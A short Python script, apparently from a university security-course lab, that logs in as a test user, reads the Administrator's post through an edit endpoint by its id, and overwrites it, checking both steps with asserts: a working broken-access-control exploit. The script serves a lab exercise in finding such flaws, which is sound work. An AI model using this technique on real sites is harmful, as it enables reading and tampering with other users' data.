import requests
import string

login_data = {'username' : 'teste1', 'password' : 'teste1'}

URL = 'http://34ead85a967c3a29f1f3d306c40d31e50f45c0adc2ef24f9f20babfa4e40.project.ssof.rnl.tecnico.ulisboa.pt'

init_url = URL + '/init'
register_url = URL + '/register'
login_url = URL + '/login'
another_user_post = URL + '/edit_post?id=1'

edit = {'id' : '1', 'content' : "I've found that out Administrator." , 'type' : 'Public'}


with requests.Session() as s:
	r = s.get(init_url)
	r = s.post(register_url, data = login_data)
	r = s.post(login_url, data = login_data)
	r = s.get(another_user_post)

	#Content of Administrator's post
	assert 'No one will find that I have no secrets.' in r.text

	r = s.post(another_user_post, data = edit)
	r = s.get(another_user_post)
	
	#New content of Administrator's post
	assert "I've found that out Administrator." in r.text
